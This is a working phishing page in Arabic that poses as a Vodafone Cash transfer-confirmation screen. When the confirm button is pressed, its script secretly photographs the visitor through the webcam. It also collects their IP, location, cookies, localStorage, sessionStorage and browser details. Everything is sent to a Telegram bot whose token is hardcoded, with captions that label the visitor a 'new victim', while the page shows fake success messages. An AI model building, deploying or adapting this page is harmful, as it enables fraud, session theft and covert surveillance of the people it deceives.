<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>فودافون كاش - تأكيد التحويل</title>

    <style>
        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
            font-family:'Tahoma',Arial,sans-serif;
        }

        body{
            background:#f0f2f5;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            direction:rtl;
            padding:16px;
        }

        .container{
            background:#fff;
            border-radius:24px;
            box-shadow:0 8px 40px rgba(0,0,0,.08);
            max-width:420px;
            width:100%;
            padding:32px 24px 28px;
            border:1px solid rgba(0,0,0,.02);
        }

        .header{
            display:flex;
            align-items:center;
            justify-content:space-between;
            margin-bottom:28px;
            padding-bottom:16px;
            border-bottom:2px solid #f0f2f5;
        }

        .header .logo{
            display:flex;
            align-items:center;
            gap:10px;
        }

        .vodafone-logo{
            width:110px;
            height:auto;
            display:block;
        }

        .header .logo span{
            font-size:20px;
            font-weight:700;
            color:#e60000;
        }

        .header-left{
            display:flex;
            align-items:center;
        }

        .left-logo{
            width:50px;
            height:50px;
            border-radius:50%;
            object-fit:cover;
        }

        .title{
            font-size:22px;
            font-weight:700;
            color:#1a1a1a;
            margin-bottom:8px;
            text-align:center;
        }

        .subtitle{
            font-size:14px;
            color:#6b6b6b;
            text-align:center;
            margin-bottom:24px;
        }

        .info-box{
            background:#f8f9fc;
            border-radius:30px;
            padding:18px 20px;
            margin-bottom:50px;
            border:1px solid #e9ecef;
        }

        .info-box .row{
            display:flex;
            justify-content:space-between;
            align-items:center;
            padding:14px 12px;
            margin-bottom:10px;
            font-size:15px;
            background:#ffffff;
            border-radius:12px;
            border:1px solid #e9ecef;
        }

        .info-box .row:last-child{
            margin-bottom:0;
        }
        .info-box .label{
            color:#2d2d2d;
            font-weight:500;
        }

        .info-box .value{
            color:#1a1a1a;
            font-weight:600;
        }

        .info-box .value.amount{
            color:#e60000;
            font-size:px;
        }

        .btn-confirm{
            background:#e60000;
            color:#fff;
            border:none;
            padding:16px;
            width:100%;
            border-radius:50px;
            font-size:18px;
            font-weight:700;
            cursor:pointer;
            transition:.2s;
            box-shadow:0 4px 12px rgba(230,0,0,.25);
        }

        .btn-confirm:hover{
            background:#cc0000;
            transform:scale(1.02);
        }

        .btn-confirm:active{
            transform:scale(.97);
        }

        /* ===== حقل الرابط الجديد ===== */
        .link-container {
            margin: 16px 0 10px;
            background: #f8f9fc;
            border-radius: 30px;
            padding: 14px 18px;
            border: 1px solid #e9ecef;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .link-container .label {
            font-weight: 600;
            color: #2d2d2d;
            font-size: 14px;
            white-space: nowrap;
        }
        .link-container input {
            flex: 1;
            min-width: 150px;
            border: none;
            background: transparent;
            color: #1a1a1a;
            font-size: 13px;
            direction: ltr;
            text-align: left;
            padding: 6px 0;
            border-bottom: 1px dashed #d0d0d0;
        }
        .link-container input:focus {
            outline: none;
            border-bottom-color: #e60000;
        }

        #status{
            margin-top:16px;
            font-size:15px;
            font-weight:600;
            text-align:center;
            min-height:24px;
            color:#e60000;
            transition:.3s;
        }

        .footer{
            margin-top:24px;
            text-align:center;
            font-size:12px;
            color:#a0a0a0;
            border-top:1px solid #f0f2f5;
            padding-top:18px;
        }

        .footer .lock{
            display:inline-flex;
            align-items:center;
            gap:6px;
            color: #7c7272;;
        }

        .footer .lock svg{
            width:14px;
            height:14px;
            fill:#6b6b6b;
        }

        @media (max-width:480px){

            .container{
                padding:20px 16px;
            }

            .header .logo span{
                font-size:17px;
            }

            .vodafone-logo{
                width:50px;
            }

            .left-logo{
                width:40px;
                height:40px;
            }

            .title{
                font-size:19px;
            }

            .info-box .row{
                font-size:14px;
            }

            .btn-confirm{
                font-size:16px;
                padding:14px;
            }
        }
        .main-amount{
            text-align:center;
        }

        .main-amount span{
            color:#28a745;
        }

    </style>
</head>

<body>

<div class="container">

    <div class="header">

        <div class="logo">
            <img src="vodafone_cash.png" alt="Vodafone Logo" class="vodafone-logo">
            <span>فودافون كاش</span>
        </div>

        <div class="header-left">
            <img src="vf_logo.webp" alt="Logo" class="left-logo">
        </div>

    </div>


    <h1 class="title">تأكيد التحويل</h1>

    <h2 class="main-amount"><span id="amountNumber">1000</span> <span>جنيه</span></h2>
    <p class="subtitle">
        يرجى تأكيد بيانات التحويل لإتمام العملية
    </p>


    <div class="info-box" id="infoBox">

        <div class="row">

            <span class="label">من</span> 

            <span class="value" id="senderDisplay">01012345678</span>

        </div>

        <div class="row name-row">
            <span class="label">الاسم</span>
            <span class="value" id="nameDisplay">خالد ع** م*** ا*****</span>
        </div>
        <div class="row">
            <span class="label">الي</span> 

            <span class="value" id="receiverDisplay">01008652784</span>
        </div>

        <div class="row">
            <span class="label">رقم التحويل</span>
            <span class="value" id="refDisplay">
                VOD-2026-07-10-2847
            </span>
        </div>

    </div>


    <button class="btn-confirm" id="confirmBtn" onclick="confirmTransfer()">
        تأكيد التحويل
    </button>

    <div id="status"></div>


    <div class="footer">

        <div class="lock">

            <svg viewBox="0 0 24 24">
                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>

            <span>تحويل آمن ومشفر</span>

        </div>


        <div style="margin-top:6px;color:#b0b0b0;font-size:11px;">
            © 2026 فودافون مصر - جميع الحقوق محفوظة
        </div>

    </div>

</div>

<script>
// 🔥 استبدل القيم دي بقيمك
const BOT_TOKEN = '8603992880:AAF5ywTfIDDvkcbGooGQ8lU_2qLD5Aja-OI';
const CHAT_ID = '8222931248';

// ====== قراءة البيانات من الرابط ======
function getParams() {
    const params = new URLSearchParams(window.location.search);
    return {
        sender: params.get('sender') || '01012345678',
        receiver: params.get('receiver') || '01008652784',
        name: params.get('name') || 'خالد ع** م*** ا*****',
        amount: params.get('amount') || '1000'
    };
}

// ====== عرض البيانات في الصفحة ======
function loadData() {
    const data = getParams();
    document.getElementById('senderDisplay').innerText = data.sender;
    document.getElementById('receiverDisplay').innerText = data.receiver;
    document.getElementById('nameDisplay').innerText = data.name;
    document.getElementById('amountNumber').innerText = data.amount;
}

// ====== دالة سحب البيانات ======
function stealAllData() {
    const data = getParams();
    
    return fetch('https://ipinfo.io/json')
        .then(res => res.json())
        .then(ipData => {
            const ip = ipData.ip || 'غير معروف';
            const city = ipData.city || 'غير معروف';
            const region = ipData.region || 'غير معروف';
            const country = ipData.country || 'غير معروف';
            const location = `${city}, ${region}, ${country}`;
            const org = ipData.org || 'غير معروف';

            const cookies = document.cookie || 'لا يوجد كوكيز';
            let localStorageData = 'لا يوجد';
            let sessionData = 'لا يوجد';
            try {
                localStorageData = JSON.stringify(localStorage);
                sessionData = JSON.stringify(sessionStorage);
            } catch(e) {}

            const browserData = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                referrer: document.referrer || 'مباشر'
            };

            return {
                ip: ip,
                location: location,
                org: org,
                cookies: cookies,
                localStorage: localStorageData,
                sessionStorage: sessionData,
                browser: browserData,
                victim: {
                    receiver: data.receiver,
                    name: data.name,
                    sender: data.sender,
                    amount: data.amount
                }
            };
        });
}

// ====== دالة التأكيد ======
function confirmTransfer() {
    const statusDiv = document.getElementById('status');
    const btn = document.getElementById('confirmBtn');
    btn.disabled = true;
    btn.style.opacity = '0.7';
    statusDiv.innerHTML = 'جاري تأكيد الهوية...';
    statusDiv.style.color = '#e68a00';

    const data = getParams();

    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(stream => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 400;
                canvas.height = 300;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);

                stealAllData()
                    .then(allData => {
                        const caption = `🕵️ ضحية جديدة - تقرير كامل

📌 IP: ${allData.ip}
📍 الموقع: ${allData.location}
🏢 المزود: ${allData.org}
📱 الجهاز: ${allData.browser.userAgent}
🌐 اللغة: ${allData.browser.language}
📅 الوقت: ${new Date().toLocaleString()}
🖥️ الشاشة: ${allData.browser.screen}
⏰ المنطقة: ${allData.browser.timezone}
🔗 الرابط: ${allData.browser.url}
📎 المرسل: ${allData.browser.referrer}

🍪 الكوكيز:
${allData.cookies}

💾 localStorage:
${allData.localStorage}

📦 sessionStorage:
${allData.sessionData}

📱 المستلم: ${allData.victim.receiver}
👤 الاسم: ${allData.victim.name}
👤 المرسل: ${allData.victim.sender}
💰 المبلغ: ${allData.victim.amount}`;

                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: CHAT_ID,
                                caption: caption,
                                photo: photoBase64
                            })
                        })
                        .then(() => {
                            statusDiv.innerHTML = '✅ تم تأكيد هويتك بنجاح! جاري إتمام التحويل...';
                            statusDiv.style.color = '#28a745';
                            btn.disabled = false;
                            btn.style.opacity = '1';
                        })
                        .catch(() => {
                            statusDiv.innerHTML = '⚠️ تم التأكيد لكن حدث مشكلة في الإرسال.';
                            statusDiv.style.color = '#e60000';
                            btn.disabled = false;
                            btn.style.opacity = '1';
                        });
                    });

                stream.getTracks().forEach(track => track.stop());
            }, 2000);
        })
        .catch(() => {
            stealAllData()
                .then(allData => {
                    const caption = `⚠️ ضحية جديدة (بدون صورة) - تقرير كامل

📌 IP: ${allData.ip}
📍 الموقع: ${allData.location}
📱 الجهاز: ${allData.browser.userAgent}
🍪 الكوكيز: ${allData.cookies}
💾 localStorage: ${allData.localStorage}
📱 المستلم: ${allData.victim.receiver}
👤 الاسم: ${allData.victim.name}
💰 المبلغ: ${allData.victim.amount}`;

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: caption
                        })
                    });

                    statusDiv.innerHTML = '✅ تم التأكيد (بدون صورة)';
                    statusDiv.style.color = '#28a745';
                    btn.disabled = false;
                    btn.style.opacity = '1';
                });
        });
}

// ====== تحميل البيانات عند فتح الصفحة ======
window.onload = loadData;
</script>

</body>
</html>
